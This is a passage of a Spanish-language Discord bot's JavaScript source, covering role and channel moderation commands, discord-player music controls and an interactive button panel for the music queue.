        if (!message.member.permissions.has(PermissionFlagsBits.ManageChannels)) return message.reply("Tu no tienes los permisos para usra este comando!");
        const channel = message.mentions.channels.first() || message.channel;
        channel.delete().then(() => message.author.send(`Canal eliminado ${channel.name}`))
            .catch(err => message.reply("Fallo al eliminar el canal"));
    }
    
    if (command === "createrole") {
        if (!message.member.permissions.has(PermissionFlagsBits.ManageRoles)) return message.reply("No tienes los permisos para usar este comando!");
        const roleName = args.join(' ');
        if (!roleName) return message.reply("Especifica cual es el nombre de este roll!");
        message.guild.roles.create({ name: roleName })
            .then(role => message.reply(`Roll creado ${role.name}`))
            .catch(err => message.reply("Fallo al crear el roll"));
    }
    
    if (command === "delrole") {
        if (!message.member.permissions.has(PermissionFlagsBits.ManageRoles)) return message.reply("Tu no tienes permisos para usar este comando!");
        const role = message.mentions.roles.first();
        if (!role) return message.reply("Mensiona el roll a eliminar!");
        role.delete()
            .then(() => message.reply(`Roll eliminado ${role.name}`))
            .catch(err => message.reply("Fallo al eliminar este roll"));
    }
    
    if (command === "giverole") {
        if (!message.member.permissions.has(PermissionFlagsBits.ManageRoles)) return message.reply("Tu no tienes permisos para usar este comando!");
        const member = message.mentions.members.first();
        const role = message.mentions.roles.first();
        if (!member || !role) return message.reply("Mensiona a un miembro para ver su roll!");
        member.roles.add(role)
            .then(() => message.reply(`Revision de roll ${role} de ${member}`))
            .catch(err => message.reply("Fallo al ver el roll"));
    }
    
     if (command === "removerole") {
        if (!message.member.permissions.has(PermissionFlagsBits.ManageRoles)) return message.reply("No tienes permisos para usar este comando!");
        const member = message.mentions.members.first();
        const role = message.mentions.roles.first();
        if (!member || !role) return message.reply("Mensiona a un miembro para quitar su roll!");
        member.roles.remove(role)
            .then(() => message.reply(`Roll ${role} eliminado de ${member}`))
            .catch(err => message.reply("Failed to remove role"));
    }
  
      if (command === 'player') {
        if (currentPlayerMessage) {
            await currentPlayerMessage.delete();
        }

        await updateMusicPanel(message.channel);
    }
    
    if (command === 'play') {
        const voiceChannel = message.member.voice.channel;
        if (!voiceChannel) return message.reply('❌ Debes estar en un canal de voz.');
    
        const query = args.join(' ');
        if (!query) return message.reply('❌ Debes especificar una canción.');
    
        try {
            let queue = player.nodes.get(message.guild.id);
    
            if (!queue) {
                queue = player.nodes.create(message.guild.id, {
                    metadata: { channel: message.channel },
                    selfDeaf: true,
                    volume: 100,
                    leaveOnEmpty: true,
                    leaveOnEmptyCooldown: 10000,
                    leaveOnEnd: false,
                    leaveOnEndCooldown: 10000,
                });
            }
    
            const { track } = await player.play(voiceChannel, query, {
                nodeOptions: queue,
            });
    
            message.reply(`🎶 **${track.title}** ha sido agregada a la cola.`);
        } catch (error) {
            console.error('❌ Error al intentar reproducir:', error);
            message.reply('❌ Ocurrió un error al intentar reproducir la canción.');
        }
    }

    if (command === 'stop') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || !queue.isPlaying()) return message.reply('❌ No hay música en reproducción.');
        queue.delete();
        message.reply('⏹ Música detenida.');
    }

    if (command === 'skip') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || !queue.isPlaying()) return message.reply('❌ No hay música en reproducción.');
        queue.node.skip();
        message.reply('⏭ Canción saltada.');
    }

    if (command === 'pause') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || !queue.isPlaying()) return message.reply('❌ No hay música en reproducción.');
        queue.node.setPaused(true);
        message.reply('⏸ Música pausada.');
    }

    if (command === 'resume') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || !queue.isPlaying()) return message.reply('❌ No hay música pausada.');
        queue.node.setPaused(false);
        message.reply('▶ Música reanudada.');
    }

    if (command === 'volume') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || !queue.isPlaying()) return message.reply('❌ No hay música en reproducción.');
        const volume = parseInt(args[0]);
        if (isNaN(volume) || volume < 0 || volume > 100) return message.reply('❌ Especifica un volumen entre 0 y 100.');
        queue.node.setVolume(volume);
        message.reply(`🔊 Volumen ajustado a **${volume}%**`);
    }

    if (command === 'list') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || queue.tracks.size === 0) return message.reply('❌ La lista de reproducción está vacía.');
    
        const tracks = queue.tracks.map((track, index) => `\`${index + 1}.\` **${track.title}** - ${track.author}`).join('\n');
    
        message.reply(`🎵 **Lista de reproducción:**\n${tracks}`);
    }

    if (command === 'info') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || !queue.isPlaying()) return message.reply('❌ No hay música en reproducción.');
        
        const currentTrack = queue.currentTrack;
        const tracks = queue.tracks.toArray(); 
        const nextTrack = tracks[0]; 
    
        const volume = queue.node.volume;
    
        const response = `🎵 **Información de reproducción**\n` +
            `▶ **Reproduciendo:** ${currentTrack.title} - ${currentTrack.author}\n` +
            (nextTrack ? `⏭ **Siguiente:** ${nextTrack.title} - ${nextTrack.author}\n` : '⏭ **Siguiente:** No hay más canciones en la cola.\n') +
            `🔊 **Volumen:** ${volume}%`;
        
        message.reply(response);
    } 

    if (command === 'time') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || !queue.isPlaying()) return message.reply('❌ No hay música en reproducción.');
    
        const currentTrack = queue.currentTrack;
        const elapsedTime = queue.node.position; 
        const totalDuration = currentTrack.durationMS; 
        const remainingTime = totalDuration - elapsedTime;
    
        if (remainingTime <= 0) {
            return message.reply('⏳ La canción está por terminar.');
        }
    
        const formatTime = (ms) => {
            const tims = Math.floor((ms / 1000) % 60);
            const tims2 = Math.floor((ms / 1000 / 60) % 60);
            return `${tims}:${tims2.toString().padStart(2, '0')}`;
        };
    
        message.reply(`⏳ **Tiempo restante:** ${formatTime(remainingTime)}`);
    }
});

player.events.on('playerStart', async (queue, track) => {
    await updateMusicPanel(queue.metadata.channel);
});

player.events.on('trackAdd', async (queue) => {
    await updateMusicPanel(queue.metadata.channel);
});

player.events.on('trackEnd', async (queue) => {
    await updateMusicPanel(queue.metadata.channel);
});

async function updateMusicPanel(channel) {
    const queue = player.nodes.get(channel.guild.id);
    if (!queue || !queue.isPlaying()) {
        return channel.send({ content: '❌ No hay música en reproducción.', embeds: [], components: [] });
    }

    const currentTrack = queue.currentTrack;
    const nextTrack = queue.tracks.toArray()[0];

    const embed = new EmbedBuilder()
        .setColor(0x1DB954)
        .setTitle('🎵 Reproduciendo ahora')
        .setDescription(`▶ **${currentTrack.title}**\n🎤 ${currentTrack.author}`)
        .setThumbnail(currentTrack.thumbnail)
        .addFields(
            { name: '⏭ Siguiente canción', value: nextTrack ? `🎵 **${nextTrack.title}**` : '🚫 No hay más canciones en la cola.', inline: false }
        );

    const row = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder().setCustomId('pause').setLabel('⏸ Pausar').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('resume').setLabel('▶ Reanudar').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId('skip').setLabel('⏭ Saltar').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('stop').setLabel('⏹ Detener').setStyle(ButtonStyle.Danger)
        );

    const row2 = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder().setCustomId('search').setLabel('🔎 Agregar canción').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('lista').setLabel('📋 Lista de canciones').setStyle(ButtonStyle.Secondary)
        );

    const message = await channel.send({ embeds: [embed], components: [row, row2] });
    currentPlayerMessage = message;
}

client.on('interactionCreate', async (interaction) => {

  const isDM2 = interation.channel.type === 'DM';
console.log(chalk.bold.cyan('┏┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅•'));
console.log(`${chalk.bold('┋[📩] Mensaje :')} ${chalk.white(interation.content)} (Tipo: ${interation.channel.type})`);
console.log(`${chalk.bold('┋[👤] De:')} ${chalk.yellow(interation.author.tag)} ${chalk.white('en el canal:')} ${isDM2 ? chalk.red('DM') : chalk.blue(interation.channel.name)} (${chalk.gray(interaction.channel.id)}`)
console.log(`${chalk.bold('┋[⚡] Servidor:')} ${isDM2 ? chalk.red('DM') : interation.guild ? chalk.green(interaction.guild.name) : chalk.gray('N/A')}`);
console.log(chalk.bold.cyan('┗┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅•'));
console.log(interaction.content) 

    if (!interaction.isButton() && !interaction.isModalSubmit()) return;

    const queue = player.nodes.get(interaction.guild.id);

    if (interaction.customId === 'pause') {
        if (!queue || !queue.isPlaying()) return interaction.reply({ content: '❌ No hay música en reproducción.', ephemeral: true });
        queue.node.setPaused(true);
        await interaction.reply({ content: '⏸ Música pausada.', ephemeral: true });
    }

    if (interaction.customId === 'resume') {
        if (!queue || !queue.isPlaying()) return interaction.reply({ content: '❌ No hay música en reproducción.', ephemeral: true });
        queue.node.setPaused(false);
        await interaction.reply({ content: '▶ Música reanudada.', ephemeral: true });
    }

    if (interaction.customId === 'skip') {
        if (!queue || !queue.isPlaying()) return interaction.reply({ content: '❌ No hay música en reproducción.', ephemeral: true });
        queue.node.skip();
        await interaction.reply({ content: '⏭ Canción saltada.', ephemeral: true });
        if (currentPlayerMessage) {
            await currentPlayerMessage.delete();
        }
    }

    if (interaction.customId === 'stop') {
        if (!queue || !queue.isPlaying()) return interaction.reply({ content: '❌ No hay música en reproducción.', ephemeral: true });
        queue.delete();
        await interaction.reply({ content: '⏹ Música detenida.', ephemeral: true });
    }

    if (interaction.customId === 'search') {
        const modal = new ModalBuilder()
            .setCustomId('search_modal')
            .setTitle('🔎 Buscar Canción');

        const songInput = new TextInputBuilder()
            .setCustomId('song_name')
            .setLabel('Nombre de la canción')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        const actionRow = new ActionRowBuilder().addComponents(songInput);
        modal.addComponents(actionRow);

        await interaction.showModal(modal);
    }

    if (interaction.customId === 'search_modal') {
        await interaction.deferReply({ ephemeral: true });
        const songName = interaction.fields.getTextInputValue('song_name');
        
        const voiceChannel = interaction.member.voice.channel;
        if (!voiceChannel) return interaction.followUp({ content: '❌ Debes estar en un canal de voz.', ephemeral: true });

        try {
            let queue = player.nodes.get(interaction.guild.id);
            if (!queue) {
                queue = player.nodes.create(interaction.guild.id, {
                    metadata: { channel: interaction.channel },
                    selfDeaf: true,
                    volume: 20,
                    leaveOnEmpty: true,
                    leaveOnEmptyCooldown: 10000,
                    leaveOnEnd: false,
                    leaveOnEndCooldown: 10000,
                });
            }

            const { track } = await player.play(voiceChannel, songName, { nodeOptions: queue });
            
            await interaction.followUp({ content: `🎶 **${track.title}** ha sido agregada a la cola.`, ephemeral: true });
            if (currentPlayerMessage) {
                await currentPlayerMessage.delete();
            }
            await updateMusicPanel(interaction.channel);
        } catch (error) {
            console.error('❌ Error al intentar reproducir:', error);
            interaction.followUp({ content: '❌ Ocurrió un error al intentar reproducir la canción.', ephemeral: true });
        }
    }

    if (interaction.customId === 'lista') {
        const tracks = queue.tracks.toArray();
        const list = tracks.map((track, index) => `\`${index + 1}\`. ${track.title}`).join('\n');
        await interaction.reply({ content: list || '❌ No hay canciones en la cola.', ephemeral: true });
    }
});

// Telling us that its online
client.once("ready", () => {
  console.log("Bot is online!");
});

// Put in your bot token (Don't share it with anyone)
client.login(token);
